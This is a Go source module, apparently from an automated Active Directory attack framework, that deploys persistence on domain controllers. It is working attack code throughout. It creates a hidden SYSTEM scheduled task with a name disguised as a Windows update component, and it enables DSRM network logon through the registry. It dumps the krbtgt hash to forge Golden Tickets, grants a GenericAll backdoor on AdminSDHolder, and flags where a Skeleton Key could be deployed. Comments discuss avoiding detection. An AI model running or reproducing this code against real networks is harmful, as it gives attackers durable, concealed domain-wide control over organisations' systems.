package modules

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

// RunPersistence deploys long-term access mechanisms against a domain controller.
// Each technique is independently attempted; a missing tool or insufficient
// privilege skips that technique rather than failing the whole phase.
//
// Techniques (best-effort, tool-gated):
//   - Scheduled task on logon (SYSTEM)            → schtasks via failover exec
//   - Golden Ticket forging                       → secretsdump + impacket-ticketer
//   - DSRM password-reuse logon enable            → reg add via failover exec
//   - AdminSDHolder GenericAll backdoor           → impacket-dacledit (preferred)
//     or bloodyAD (fallback)
//   - Skeleton Key (informational)                → flagged when go-mimikatz remote
//     exec is viable; not auto-deployed
//     because of high detection signal
func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		fmt.Println("[!] No target for persistence")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		fmt.Println("[!] No credentials for persistence")
		result.Success = false
		return result
	}

	ctx := context.Background()
	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)

	deployed := 0

	if deployScheduledTask(ctx, exec, host, result) {
		deployed++
	}
	if deployDSRM(ctx, exec, host, result) {
		deployed++
	}
	if host.IsDC {
		if deployGoldenTicket(ctx, host, domain, user, pass, hash, result) {
			deployed++
		}
		if deployAdminSDHolder(ctx, host, domain, user, pass, hash, result) {
			deployed++
		}
		flagSkeletonKeyOpportunity(host, result)
	} else {
		fmt.Println("[*] Target is not a DC — skipping Golden Ticket / AdminSDHolder / Skeleton Key")
	}

	if deployed == 0 {
		fmt.Println("[!] No persistence mechanisms deployed")
		result.Success = false
	} else {
		fmt.Printf("[+] %d persistence mechanism(s) deployed\n", deployed)
	}
	return result
}

// deployScheduledTask creates an onlogon task running as SYSTEM. Hardened over the
// original by routing through RunFailover (so a wmiexec hang doesn't kill the phase)
// and by giving the task a less attention-grabbing name.
func deployScheduledTask(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
	fmt.Println("[*] Creating scheduled task persistence (onlogon, SYSTEM)...")
	cmd := `schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" ` +
		`/tr "cmd.exe /c start /B powershell -NoP -W Hidden -C exit" ` +
		`/sc onlogon /ru SYSTEM /rl HIGHEST /f`
	r := exec.Execute(ctx, core.Action{
		Artifact: cmd, Method: "command", Timeout: 45 * time.Second,
	})
	if !r.Success {
		fmt.Printf("[!] Scheduled task creation failed (last method=%s)\n", r.Method)
		return false
	}
	fmt.Printf("[+] Scheduled task created via %s\n", r.Method)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "schtasks", Key: host.IP,
		Value:     "onlogon task as SYSTEM",
		RawOutput: r.Output, Timestamp: time.Now(),
	})
	return true
}

// deployDSRM enables DSRM password-reuse logon via:
//
//	reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
//
// On a DC this lets the local Administrator (DSRM) account log in over the network
// using the DSRM password. Requires SYSTEM context, so we run via failover (which
// promotes through smbexec/atexec).
func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
	if !host.IsDC {
		return false
	}
	fmt.Println("[*] Enabling DSRM password-reuse logon (registry)...")
	cmd := `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f`
	r := exec.Execute(ctx, core.Action{
		Artifact: cmd, Method: "command", Timeout: 30 * time.Second,
	})
	if !r.Success {
		fmt.Printf("[!] DSRM registry write failed (last method=%s)\n", r.Method)
		return false
	}
	fmt.Printf("[+] DSRM logon behavior set to 2 via %s\n", r.Method)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "dsrm", Key: host.IP,
		Value:     "DSRMAdminLogonBehavior=2 (password-reuse logon enabled)",
		RawOutput: r.Output, Timestamp: time.Now(),
	})
	return true
}

// deployGoldenTicket performs a real Golden Ticket forge:
//  1. impacket-secretsdump -just-dc-user krbtgt to obtain the krbtgt NT hash + Domain SID
//  2. impacket-ticketer to forge a TGT for a fictitious admin user (configurable)
//  3. Write the .ccache to the local /tmp and record the path in evidence so the
//     operator can KRB5CCNAME it for follow-on commands.
//
// This requires DA-level creds (already enforced upstream by validation phase).
func deployGoldenTicket(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
	_ = ctx
	fmt.Println("[*] Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")

	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
		fmt.Println("[!] impacket-secretsdump not found, skipping Golden Ticket")
		return false
	}
	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
		fmt.Println("[!] impacket-ticketer not found, skipping Golden Ticket")
		return false
	}

	authSpec := buildImpacketAuth(domain, user, pass, hash, host.IP)

	// Pull just the krbtgt secret + the domain SID from the DC.
	args := []string{authSpec, "-just-dc-user", "krbtgt"}
	args = append(args, impacketHashArgs(hash)...)
	r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
	if !r.Success {
		fmt.Printf("[!] secretsdump krbtgt failed: %s\n", r.Stderr)
		return false
	}

	krbtgtHash := extractKrbtgtNTHash(r.Stdout)
	if krbtgtHash == "" {
		fmt.Println("[!] Could not extract krbtgt NT hash from secretsdump output")
		return false
	}

	// secretsdump -just-dc-user does not print Domain SID, so resolve it via
	// impacket-lookupsid (cheap, single LSAR call). Cache miss → bail.
	domainSID := resolveDomainSID(domain, user, pass, hash, host.IP)
	if domainSID == "" {
		fmt.Println("[!] Could not resolve domain SID via impacket-lookupsid")
		return false
	}

	ts := time.Now().Unix()
	ccacheUser := fmt.Sprintf("svc_health_%d", ts)
	ccachePath := fmt.Sprintf("/tmp/golden_%s.ccache", ccacheUser)

	tArgs := []string{
		"-nthash", krbtgtHash,
		"-domain-sid", domainSID,
		"-domain", domain,
		ccacheUser,
	}
	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
	if !tr.Success {
		fmt.Printf("[!] impacket-ticketer failed: %s\n", tr.Stderr)
		return false
	}

	// impacket-ticketer writes <user>.ccache in CWD; move it deterministically.
	moveR := utils.RunCommandTimeout(10*time.Second, "mv",
		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})
	if !moveR.Success {
		// Not fatal — the ccache exists somewhere reachable
		ccachePath = fmt.Sprintf("./%s.ccache", ccacheUser)
	}

	fmt.Printf("[+] Golden Ticket forged: %s\n", ccachePath)
	fmt.Printf("    use: export KRB5CCNAME=%s\n", ccachePath)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "golden_ticket", Key: ccacheUser + "@" + domain,
		Value:      ccachePath,
		Confidence: 0.95, RawOutput: tr.Stdout, Timestamp: time.Now(),
	})
	// Also record the krbtgt hash itself as a credential so future runs can re-forge.
	result.Creds = append(result.Creds, core.Credential{
		Type: core.CredHash, Username: "krbtgt", Domain: domain,
		Hash: krbtgtHash, Secret: krbtgtHash,
		Source: "secretsdump_persistence", Target: host.IP, Validated: true,
	})
	return true
}

// deployAdminSDHolder grants GenericAll on the AdminSDHolder container so the
// SDProp process propagates the ACE to every protected group member every 60min.
//
// Tries impacket-dacledit (modern, native) first; falls back to bloodyAD which
// many red teamers have installed. Both are LDAP operations — no shell needed.
func deployAdminSDHolder(ctx context.Context, host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
	_ = ctx
	fmt.Println("[*] Backdooring AdminSDHolder (GenericAll → SDProp propagation)...")

	// We grant the existing admin user GenericAll on AdminSDHolder. The principal
	// is the same authenticated user — survives password reset because the ACE
	// remains on AdminSDHolder and SDProp re-applies it to every protected member.
	principal := user

	if _, err := utils.FindTool("impacket-dacledit"); err == nil {
		auth := buildImpacketAuth(domain, user, pass, hash, host.IP)
		args := []string{
			auth,
			"-action", "write",
			"-rights", "FullControl",
			"-principal", principal,
			"-target-dn", buildAdminSDHolderDN(domain),
		}
		args = append(args, impacketHashArgs(hash)...)
		r := utils.RunCommandTimeout(60*time.Second, "impacket-dacledit", args)
		if r.Success {
			fmt.Printf("[+] AdminSDHolder GenericAll granted to %s (impacket-dacledit)\n", principal)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
				Source: "adminsdholder", Key: host.IP,
				Value:      fmt.Sprintf("GenericAll granted to %s on AdminSDHolder", principal),
				Confidence: 0.95, RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			return true
		}
		fmt.Printf("[!] impacket-dacledit failed: %s\n", r.Stderr)
	}

	if _, err := utils.FindTool("bloodyAD"); err == nil {
		auth := []string{"-H", host.IP, "-d", domain, "-u", user}
		if hash != "" {
			auth = append(auth, "-p", ":"+hash)
		} else {
			auth = append(auth, "-p", pass)
		}
		args := append(auth, "add", "genericAll", buildAdminSDHolderDN(domain), principal)
		r := utils.RunCommandTimeout(60*time.Second, "bloodyAD", args)
		if r.Success {
			fmt.Printf("[+] AdminSDHolder GenericAll granted to %s (bloodyAD)\n", principal)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
				Source: "adminsdholder", Key: host.IP,
				Value:      fmt.Sprintf("GenericAll granted to %s on AdminSDHolder", principal),
				Confidence: 0.9, RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			return true
		}
		fmt.Printf("[!] bloodyAD failed: %s\n", r.Stderr)
	}

	fmt.Println("[!] Neither impacket-dacledit nor bloodyAD available, skipping AdminSDHolder")
	return false
}

// flagSkeletonKeyOpportunity records that a Skeleton Key implant is viable on
// this host without actually deploying it — Skeleton Key is high-noise (touches
// LSASS, alerts every modern EDR) and should be an explicit operator decision,
// not an auto-applied default.
func flagSkeletonKeyOpportunity(host core.Host, result *core.ToolResult) {
	if !tools.GoMimikatz.Available() {
		return
	}
	fmt.Println("[*] Skeleton Key opportunity: go-mimikatz available, target is DC")
	fmt.Println("    (not auto-deployed — high detection signal; run manually if scoped)")
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "skeleton_key", Key: host.IP,
		Value:      "viable (not deployed)",
		Confidence: 0.5, Timestamp: time.Now(),
	})
}

// buildImpacketAuth returns the auth spec for impacket CLI tools. The user and
// password are URL-encoded so passwords containing ':' or '@' (which impacket
// parses to split DOMAIN/user:pass@target) don't get misinterpreted.
//
// Hash-only callers should also append the result of impacketHashArgs(hash) to
// the args slice; without it, impacket has no credential and authentication
// fails silently.
func buildImpacketAuth(domain, user, pass, hash, dcIP string) string {
	u := url.QueryEscape(user)
	if hash != "" && pass == "" {
		return fmt.Sprintf("%s/%s@%s", domain, u, dcIP)
	}
	return fmt.Sprintf("%s/%s:%s@%s", domain, u, url.QueryEscape(pass), dcIP)
}

// impacketHashArgs returns the CLI args that supply an NT hash to impacket
// tools when the auth spec form omits a password. Returns nil when hash is
// empty so it can be unconditionally appended.
func impacketHashArgs(hash string) []string {
	if hash == "" {
		return nil
	}
	return []string{"-hashes", ":" + hash}
}

func buildAdminSDHolderDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return "CN=AdminSDHolder,CN=System," + strings.Join(dcs, ",")
}

var krbtgtNTRe = regexp.MustCompile(`(?m)^krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::`)

func extractKrbtgtNTHash(secretsdumpOut string) string {
	m := krbtgtNTRe.FindStringSubmatch(secretsdumpOut)
	if len(m) < 2 {
		return ""
	}
	return strings.ToLower(m[1])
}

var domainSIDRe = regexp.MustCompile(`Domain SID is:\s*(S-1-5-21-[0-9-]+)`)

// resolveDomainSID calls impacket-lookupsid against the DC and parses the
// "Domain SID is:" line. Returns "" on any failure.
func resolveDomainSID(domain, user, pass, hash, dcIP string) string {
	if _, err := utils.FindTool("impacket-lookupsid"); err != nil {
		return ""
	}
	auth := buildImpacketAuth(domain, user, pass, hash, dcIP)
	args := []string{auth, "0"} // RID 0 just enumerates the domain
	args = append(args, impacketHashArgs(hash)...)
	r := utils.RunCommandTimeout(45*time.Second, "impacket-lookupsid", args)
	if !r.Success {
		return ""
	}
	m := domainSIDRe.FindStringSubmatch(r.Stdout)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}
